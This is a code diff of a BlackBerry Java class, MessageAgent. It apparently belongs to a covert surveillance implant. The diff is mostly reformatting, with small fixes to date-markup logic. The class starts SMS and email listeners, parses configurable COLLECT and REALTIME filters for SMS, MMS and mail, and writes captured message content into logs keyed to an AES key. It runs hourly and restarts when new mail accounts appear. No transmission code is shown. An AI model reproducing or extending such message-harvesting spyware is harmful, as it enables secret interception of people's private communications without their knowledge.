@@ -49,7 +49,6 @@ import blackberry.utils.WChar;
  uFlags = 1 : body retrieved
  0: non ha superato i controlli di size, il body viene tagliato
 
-
  */
 
 /**
@@ -57,331 +56,339 @@ import blackberry.utils.WChar;
  */
 public final class MessageAgent extends Agent {
 
-	//#ifdef DEBUG
-	static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
-	//#endif
+    //#ifdef DEBUG
+    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
+    //#endif
 
-	protected static final int SLEEPTIME = 5000;
-	protected static final int PERIODTIME = 60 * 60 * 1000;
+    protected static final int SLEEPTIME = 5000;
+    protected static final int PERIODTIME = 60 * 60 * 1000;
 
-	MailListener mailListener;
-	SmsListener smsListener;
+    MailListener mailListener;
+    SmsListener smsListener;
 
-	TimestampMarkup markupDate;
-	//public Date lastcheck = new Date(0);
+    TimestampMarkup markupDate;
+    //public Date lastcheck = new Date(0);
 
-	protected String identification;
-	public IntHashtable filtersSMS = new IntHashtable();
-	public IntHashtable filtersMMS = new IntHashtable();
-	public IntHashtable filtersEMAIL = new IntHashtable();
+    protected String identification;
+    public IntHashtable filtersSMS = new IntHashtable();
+    public IntHashtable filtersMMS = new IntHashtable();
+    public IntHashtable filtersEMAIL = new IntHashtable();
 
-	boolean firstRun;
+    boolean firstRun;
 
-	/**
-	 * Instantiates a new message agent.
-	 * 
-	 * @param agentStatus
-	 *            the agent status
-	 */
-	public MessageAgent(final boolean agentStatus) {
-		super(AGENT_MESSAGE, agentStatus, Conf.AGENT_MESSAGE_ON_SD,
-				"MessageAgent");
+    /**
+     * Instantiates a new message agent.
+     * 
+     * @param agentStatus
+     *            the agent status
+     */
+    public MessageAgent(final boolean agentStatus) {
+        super(AGENT_MESSAGE, agentStatus, Conf.AGENT_MESSAGE_ON_SD,
+                "MessageAgent");
 
-		//#ifdef DBC
-		Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
-				"Wrong Conversion");
-		//#endif
+        //#ifdef DBC
+        Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
+                "Wrong Conversion");
+        //#endif
 
-		mailListener = new MailListener(this);
-		smsListener = SmsListener.getInstance();
-		smsListener.setMessageAgent(this);
-	}
+        mailListener = new MailListener(this);
+        smsListener = SmsListener.getInstance();
+        smsListener.setMessageAgent(this);
+    }
 
-	/**
-	 * Instantiates a new message agent.
-	 * 
-	 * @param agentStatus
-	 *            the agent status
-	 * @param confParams
-	 *            the conf params
-	 */
-	protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
-		this(agentStatus);
+    /**
+     * Instantiates a new message agent.
+     * 
+     * @param agentStatus
+     *            the agent status
+     * @param confParams
+     *            the conf params
+     */
+    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
+        this(agentStatus);
 
-		// mantiene la data prima di controllare tutte le email
-		markupDate = new TimestampMarkup(agentId, Keys.getInstance()
-				.getAesKey());
+        // mantiene la data prima di controllare tutte le email
+        markupDate = new TimestampMarkup(agentId, Keys.getInstance()
+                .getAesKey());
 
-		Date lastcheck = lastcheckGet("COLLECT");
-		//#ifdef DEBUG_TRACE
-		debug.trace("MessageAgent lastcheck: " + lastcheck);
-		//#endif
+        parse(confParams);
 
-		parse(confParams);
+        setDelay(SLEEPTIME);
+        setPeriod(PERIODTIME);
+    }
 
-		setDelay(SLEEPTIME);
-		setPeriod(PERIODTIME);
+    private static MessageAgent instance;
 
-		//#ifdef DBC
-		Check.ensures(lastcheck != null, "MessageAgent: null lastcheck");
-		//#endif
-	}
+    public static MessageAgent getInstance() {
+        if (instance == null) {
+            instance = (MessageAgent) Status.getInstance().getAgent(
+                    Agent.AGENT_MESSAGE);
+        }
+        return instance;
+    }
 
-	private static MessageAgent instance;
+    /*
+     * (non-Javadoc)
+     * @see blackberry.threadpool.TimerJob#actualRun()
+     */
+    public void actualRun() {
 
-	public static MessageAgent getInstance() {
-		if (instance == null) {
-			instance = (MessageAgent) Status.getInstance().getAgent(
-					Agent.AGENT_MESSAGE);
-		}
-		return instance;
-	}
+        // Ogni ora viene verificato se i nomi degli account corrisponde
+        // se non corrisponde, restart dell'agente.
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.threadpool.TimerJob#actualRun()
-	 */
-	public void actualRun() {
+        if (firstRun) {
+            //#ifdef DEBUG_INFO
+            debug.info("First Run");
+            //#endif
+            firstRun = false;
+            smsListener.run();
+            mailListener.run();
+        }
 
-		// Ogni ora viene verificato se i nomi degli account corrisponde
-		// se non corrisponde, restart dell'agente.
+        if (haveNewAccount()) {
+            //#ifdef DEBUG_INFO
+            debug.info("Restarting MessageAgent, new account");
+            //#endif
+            AgentManager.getInstance().reStart(agentId);
+        }
 
-		if (firstRun) {
-			//#ifdef DEBUG_INFO
-			debug.info("First Run");
-			//#endif
-			firstRun = false;
-			smsListener.run();
-			mailListener.run();
-		}
+    }
 
-		if (haveNewAccount()) {
-			//#ifdef DEBUG_INFO
-			debug.info("Restarting MessageAgent, new account");
-			//#endif
-			AgentManager.getInstance().reStart(agentId);
-		}
+    private boolean haveNewAccount() {
 
-	}
+        return mailListener.haveNewAccount();
+    }
 
-	private boolean haveNewAccount() {
+    /*
+     * (non-Javadoc)
+     * @see blackberry.threadpool.TimerJob#actualStart()
+     */
+    public void actualStart() {
+        firstRun = true;
+        smsListener.start();
+        mailListener.start();
+    }
 
-		return mailListener.haveNewAccount();
-	}
+    /*
+     * (non-Javadoc)
+     * @see blackberry.threadpool.TimerJob#actualStop()
+     */
+    public void actualStop() {
+        smsListener.stop();
+        mailListener.stop();
+    }
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.threadpool.TimerJob#actualStart()
-	 */
-	public void actualStart() {
-		firstRun = true;
-		smsListener.start();
-		mailListener.start();
-	}
+    /**
+     * Creates the log.
+     * 
+     * @param additionalData
+     *            the additional data
+     * @param content
+     *            the content
+     * @param logType
+     */
+    public void createLog(final byte[] additionalData, final byte[] content,
+            final int logType) {
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.threadpool.TimerJob#actualStop()
-	 */
-	public void actualStop() {
-		smsListener.stop();
-		mailListener.stop();
-	}
+        //#ifdef DBC
+        Check.requires(content != null, "createLog content null");
+        Check.requires(log != null, "log null");
+        //#endif
 
-	/**
-	 * Creates the log.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param content
-	 *            the content
-	 * @param logType
-	 */
-	public void createLog(final byte[] additionalData, final byte[] content,
-			final int logType) {
+        synchronized (log) {
+            log.createLog(additionalData, logType);
+            log.writeLog(content);
+            log.close();
+        }
 
-		//#ifdef DBC
-		Check.requires(content != null, "createLog content null");
-		Check.requires(log != null, "log null");
-		//#endif
+        //#ifdef DEBUG_TRACE
+        debug.trace("log created");
+        //#endif
+    }
 
-		synchronized (log) {
-			log.createLog(additionalData, logType);
-			log.writeLog(content);
-			log.close();
-		}
+    /*    *//**
+     * Inits the markup.
+     * 
+     * @return the long
+     */
 
-		//#ifdef DEBUG_TRACE
-		debug.trace("log created");
-		//#endif
-	}
+    /*
+     * (non-Javadoc)
+     * @see blackberry.agent.Agent#parse(byte[])
+     */
+    protected boolean parse(final byte[] conf) {
 
-	/*    *//**
-	 * Inits the markup.
-	 * 
-	 * @return the long
-	 */
+        final Vector tokens = tokenize(conf);
+        if (tokens == null) {
+            //#ifdef DEBUG
+            debug.error("Cannot tokenize conf");
+            //#endif
+            return false;
+        }
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.agent.Agent#parse(byte[])
-	 */
-	protected boolean parse(final byte[] conf) {
+        final int size = tokens.size();
+        for (int i = 0; i < size; ++i) {
+            final Prefix token = (Prefix) tokens.elementAt(i);
 
-		final Vector tokens = tokenize(conf);
-		if (tokens == null) {
-			//#ifdef DEBUG
-			debug.error("Cannot tokenize conf");
-			//#endif
-			return false;
-		}
+            switch (token.type) {
+            case Prefix.TYPE_IDENTIFICATION:
+                // IDENTIFICATION TAG
+                identification = WChar.getString(conf, token.payloadStart,
+                        token.length, false);
+                //#ifdef DEBUG_TRACE
+                debug.trace("Type 1: " + identification);
+                //#endif
+                break;
+            case Prefix.TYPE_FILTER:
+                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
+                try {
+                    final Filter filter = new Filter(conf, token.payloadStart,
+                            token.length);
+                    if (filter.isValid()) {
+                        switch (filter.classtype) {
+                        case Filter.CLASS_EMAIL:
+                            //#ifdef DEBUG_INFO
+                            debug.info(filter.toString());
+                            //#endif
 
-		final int size = tokens.size();
-		for (int i = 0; i < size; ++i) {
-			final Prefix token = (Prefix) tokens.elementAt(i);
+                            if (filter.type == Filter.TYPE_COLLECT) {
+                                //#ifdef DEBUG_TRACE
+                                debug.trace("Filter.TYPE_COLLECT!");
+                                //#endif
 
-			switch (token.type) {
-			case Prefix.TYPE_IDENTIFICATION:
-				// IDENTIFICATION TAG
-				identification = WChar.getString(conf, token.payloadStart,
-						token.length, false);
-				//#ifdef DEBUG_TRACE
-				debug.trace("Type 1: " + identification);
-				//#endif
-				break;
-			case Prefix.TYPE_FILTER:
-				// Filtro (sempre 2, uno COLLECT e uno REALTIME);
-				try {
-					final Filter filter = new Filter(conf, token.payloadStart,
-							token.length);
-					if (filter.isValid()) {
-						switch (filter.classtype) {
-						case Filter.CLASS_EMAIL:
-							//#ifdef DEBUG_INFO
-							debug.info(filter.toString());
-							//#endif
+                                Date oldfrom = lastcheckGet("FilterFROM");
+                                Date oldto = lastcheckGet("FilterTO");
 
-							if (filter.type == Filter.TYPE_COLLECT) {
-								Date oldfrom = lastcheckGet("FilterFROM");
-								Date oldto = lastcheckGet("FilterTO");
+                                if (filter.fromDate.getTime() == oldfrom
+                                        .getTime()
+                                        && filter.toDate.getTime() == oldto
+                                                .getTime()) {
+                                    //#ifdef DEBUG_INFO
+                                    debug.info("same Mail Collect Filter");
+                                    //#endif
+                                } else {
+                                    //#ifdef DEBUG_WARN
+                                    debug
+                                            .warn("Changed collect filter, resetting markup");
+                                    debug.trace("oldfrom: " + oldfrom);
+                                    debug.trace("oldto: " + oldto);
+                                    //#endif
+                                    lastcheckReset();
+                                    lastcheckSet("FilterFROM", filter.fromDate);
+                                    lastcheckSet("FilterTO", filter.toDate);
+                                }
 
-								if (filter.fromDate.getTime() == oldfrom
-										.getTime()
-										&& filter.toDate.getTime() == oldto
-												.getTime()) {
-									//#ifdef DEBUG_INFO
-									debug.info("same Mail Collect Filter");
-									//#endif
-								} else {
-									//#ifdef DEBUG_WARN
-									debug
-											.warn("Changed collect filter, resetting markup");
-									debug.trace("oldfrom: " + oldfrom);
-									debug.trace("oldto: " + oldto);
-									//#endif
-									lastcheckReset();
-									lastcheckSet("FilterFROM", filter.fromDate);
-									lastcheckSet("FilterTO", filter.toDate);
-								}
+                            }
 
-							}
+                            //#ifdef DEBUG_TRACE
+                            debug.trace("put: " + filter.type);
+                            //#endif
+                            filtersEMAIL.put(filter.type, filter);
 
-							filtersEMAIL.put(filter.type, filter);
+                            break;
+                        case Filter.CLASS_MMS:
+                            //#ifdef DEBUG_INFO
+                            debug.info(filter.toString());
+                            //#endif
+                            filtersMMS.put(filter.type, filter);
+                            break;
+                        case Filter.CLASS_SMS:
+                            //#ifdef DEBUG_INFO                            
+                            debug.info(filter.toString());
+                            //#endif
+                            filtersSMS.put(filter.type, filter);
+                            break;
+                        case Filter.CLASS_UNKNOWN: // fall through
+                        default:
+                            //#ifdef DEBUG
+                            debug.error("unknown classtype: "
+                                    + filter.classtype);
+                            //#endif
+                            break;
+                        }
+                    }
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("Type 2: header valid: " + filter.isValid());
+                    //#endif
+                } catch (final Exception e) {
+                    //#ifdef DEBUG
+                    debug.error("Cannot filter " + e);
+                    //#endif
+                }
+                break;
 
-							break;
-						case Filter.CLASS_MMS:
-							//#ifdef DEBUG_INFO
-							debug.info(filter.toString());
-							//#endif
-							filtersMMS.put(filter.type, filter);
-							break;
-						case Filter.CLASS_SMS:
-							//#ifdef DEBUG_INFO                            
-							debug.info(filter.toString());
-							//#endif
-							filtersSMS.put(filter.type, filter);
-							break;
-						case Filter.CLASS_UNKNOWN: // fall through
-						default:
-							//#ifdef DEBUG
-							debug.error("unknown classtype: "
-									+ filter.classtype);
-							//#endif
-							break;
-						}
-					}
-					//#ifdef DEBUG_TRACE
-					debug.trace("Type 2: header valid: " + filter.isValid());
-					//#endif
-				} catch (final Exception e) {
-					//#ifdef DEBUG
-					debug.error("Cannot filter " + e);
-					//#endif
-				}
-				break;
+            default:
+                //#ifdef DEBUG
+                debug.error("Unknown type: " + token.type);
+                //#endif
+                break;
+            }
+        }
 
-			default:
-				//#ifdef DEBUG
-				debug.error("Unknown type: " + token.type);
-				//#endif
-				break;
-			}
-		}
+        return true;
+    }
 
-		return true;
-	}
+    private Vector tokenize(final byte[] conf) {
+        final Vector tokens = new Vector();
+        int offset = 0;
+        final int length = conf.length;
 
-	private Vector tokenize(final byte[] conf) {
-		final Vector tokens = new Vector();
-		int offset = 0;
-		final int length = conf.length;
+        while (offset < length) {
+            final Prefix token = new Prefix(conf, offset);
+            if (!token.isValid()) {
 
-		while (offset < length) {
-			final Prefix token = new Prefix(conf, offset);
-			if (!token.isValid()) {
+                return null;
+            } else {
+                tokens.addElement(token);
+                offset += token.length + 4;
+            }
+        }
 
-				return null;
-			} else {
-				tokens.addElement(token);
-				offset += token.length + 4;
-			}
-		}
+        return tokens;
+    }
 
-		return tokens;
-	}
+    public synchronized void lastcheckSet(String key, Date date) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("Writing markup: " + key + " date: " + date);
+        //#endif
 
-	public synchronized void lastcheckSet(String key, Date date) {
-		//#ifdef DEBUG_TRACE
-		debug.trace("Writing markup: " + key + " date: " + date);
-		//#endif
+        MessageAgent agent = MessageAgent.getInstance();
 
-		MessageAgent.getInstance().markupDate.put(key, date);
+        if (agent != null) {
+            agent.markupDate.put(key, date);
+        } else {
+            markupDate.put(key, date);
+        }
 
-	}
+    }
 
-	public synchronized Date lastcheckGet(String key) {
+    public synchronized Date lastcheckGet(String key) {
 
-		//#ifdef DBC
-		Check.requires(markupDate != null, "lastcheckGet markupDate==null");
-		//#endif
+        //#ifdef DBC
+        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
+        //#endif
 
-		Date date = markupDate.get(key);
+        Date date = markupDate.get(key);
 
-		//#ifdef DEBUG_TRACE
-		debug.trace("getLastCheck: " + key + " = " + date);
-		//#endif
+        //#ifdef DEBUG_TRACE
+        debug.trace("getLastCheck: " + key + " = " + date);
+        //#endif
 
-		if (date == null) {
-			return new Date(0);
-		} else {
-			return date;
-		}
-	}
+        if (date == null) {
+            date = new Date(0);
+            markupDate.put(key, date);
+        }
+        return date;
+    }
 
-	public synchronized void lastcheckReset() {
-		markupDate.removeMarkup();
+    public synchronized void lastcheckReset() {
+        //#ifdef DEBUG_TRACE
+        debug.trace("lastcheckReset markupDate: " + markupDate);
+        //#endif
 
-		//lastcheck = new Date(0); 
-	}
+        markupDate.removeMarkup();
+
+        //lastcheck = new Date(0); 
+    }
 
 }
